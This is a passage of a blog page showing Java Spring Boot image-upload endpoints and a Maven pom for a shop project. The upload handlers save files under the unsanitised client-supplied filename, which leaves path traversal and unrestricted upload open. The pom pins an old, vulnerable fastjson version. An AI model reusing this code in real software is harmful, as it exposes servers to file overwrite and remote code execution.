Map&lt;String, Object&gt; url = <span class="keyword">new</span> HashMap&lt;&gt;() ;</span><br><span class="line">        url.put(<span class="string">"url"</span>,ip+cata+docname) ;</span><br><span class="line">        <span class="keyword">return</span> url ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 商品信息上传</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> file</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"uploadgoodspic"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">GoodspicUpload</span><span class="params">(@RequestParam(value = <span class="string">"file"</span>,required = <span class="keyword">true</span>)</span> MultipartFile file) </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String cata = <span class="string">"business/goods/"</span> + IdUtil.Gid() + <span class="string">"/"</span>;</span><br><span class="line">        String docname = file.getOriginalFilename() ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Objects.isNull(file) || file.isEmpty()) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"文件为空，请重新上传"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = file.getBytes();</span><br><span class="line">            Path path = Paths.get(spath + cata + docname);</span><br><span class="line">            <span class="comment">//如果没有files文件夹，则创建</span></span><br><span class="line">            <span class="keyword">if</span> (!Files.isWritable(path)) &#123;</span><br><span class="line">                Files.createDirectories(Paths.get(spath+cata));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//文件写入指定路径</span></span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Object&gt; url = <span class="keyword">new</span> HashMap&lt;&gt;() ;</span><br><span class="line">        url.put(<span class="string">"url"</span>,ip+cata+docname) ;</span><br><span class="line">        <span class="keyword">return</span> url ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 商品图标上传</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> file</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"uploadgoodsicon"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">GoodsIconUpload</span><span class="params">(@RequestParam(value = <span class="string">"file"</span>,required = <span class="keyword">true</span>)</span> MultipartFile file) </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String cata = <span class="string">"business/goods/"</span> + IdUtil.Gid() + <span class="string">"/"</span>;</span><br><span class="line">        String docname = file.getOriginalFilename() ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Objects.isNull(file) || file.isEmpty()) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"文件为空，请重新上传"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = file.getBytes();</span><br><span class="line">            Path path = Paths.get(spath + cata + docname);</span><br><span class="line">            <span class="comment">//如果没有files文件夹，则创建</span></span><br><span class="line">            <span class="keyword">if</span> (!Files.isWritable(path)) &#123;</span><br><span class="line">                Files.createDirectories(Paths.get(spath+cata));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//文件写入指定路径</span></span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Object&gt; url = <span class="keyword">new</span> HashMap&lt;&gt;() ;</span><br><span class="line">        url.put(<span class="string">"url"</span>,ip+cata+docname) ;</span><br><span class="line">        <span class="keyword">return</span> url ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 商家背景上传</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> file</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"uploadbusinesspic"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">BusinessPicUpload</span><span class="params">(@RequestParam(value = <span class="string">"file"</span>,required = <span class="keyword">true</span>)</span> MultipartFile file)</span>&#123;</span><br><span class="line"></span><br><span class="line">        String cata = <span class="string">"business/businessman/"</span> + IdUtil.Bid() + <span class="string">"/"</span>;</span><br><span class="line">        String docname = file.getOriginalFilename() ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Objects.isNull(file) || file.isEmpty()) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"文件为空，请重新上传"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = file.getBytes();</span><br><span class="line">            Path path = Paths.get(spath + cata + docname);</span><br><span class="line">            <span class="comment">//如果没有files文件夹，则创建</span></span><br><span class="line">            <span class="keyword">if</span> (!Files.isWritable(path)) &#123;</span><br><span class="line">                Files.createDirectories(Paths.get(spath+cata));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//文件写入指定路径</span></span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Object&gt; url = <span class="keyword">new</span> HashMap&lt;&gt;() ;</span><br><span class="line">        url.put(<span class="string">"url"</span>,ip+cata+docname) ;</span><br><span class="line">        <span class="keyword">return</span> url ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 商家logo上传</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> file</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"uploadbusinesslogo"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">BusinessLogoUpload</span><span class="params">(@RequestParam(value = <span class="string">"file"</span>,required = <span class="keyword">true</span>)</span> MultipartFile file)</span>&#123;</span><br><span class="line"></span><br><span class="line">        String cata = <span class="string">"business/businessman/"</span> + IdUtil.Bid() + <span class="string">"/"</span>;</span><br><span class="line">        String docname = file.getOriginalFilename() ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Objects.isNull(file) || file.isEmpty()) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"文件为空，请重新上传"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = file.getBytes();</span><br><span class="line">            Path path = Paths.get(spath + cata + docname);</span><br><span class="line">            <span class="comment">//如果没有files文件夹，则创建</span></span><br><span class="line">            <span class="keyword">if</span> (!Files.isWritable(path)) &#123;</span><br><span class="line">                Files.createDirectories(Paths.get(spath+cata));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//文件写入指定路径</span></span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Object&gt; url = <span class="keyword">new</span> HashMap&lt;&gt;() ;</span><br><span class="line">        url.put(<span class="string">"url"</span>,ip+cata+docname) ;</span><br><span class="line">        <span class="keyword">return</span> url ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="地表最强pom-gt-专治疑难杂症"><a href="#地表最强pom-gt-专治疑难杂症" class="headerlink" title="地表最强pom =&gt; 专治疑难杂症"></a>地表最强pom =&gt; 专治疑难杂症</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.6.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.obox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>obox<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>obox<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Demo project for Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;dependency&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;artifactId&gt;spring-security-test&lt;/artifactId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;scope&gt;test&lt;/scope&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;/dependency&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.33<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 微信支付 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.httpcomponents/httpclient --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.httpcomponents<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>httpclient<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.5.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.21<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-simple<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.21<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- Redis --&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- RestTemplete --&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.httpcomponents<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>httpclient<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.bouncycastle<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>bcprov-jdk15on<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.57<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-lang3<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 微信支付--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">licenses</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">license</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>The BSD 3-Clause License<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://opensource.org/licenses/BSD-3-Clause<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">distribution</span>&gt;</span>repo<span class="tag">&lt;/<span class="name">distribution</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">license</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">licenses</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">scm</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span><span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">connection</span>&gt;</span><span class="tag">&lt;/<span class="name">connection</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">developerConnection</span>&gt;</span><span class="tag">&lt;/<span class="name">developerConnection</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">scm</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span 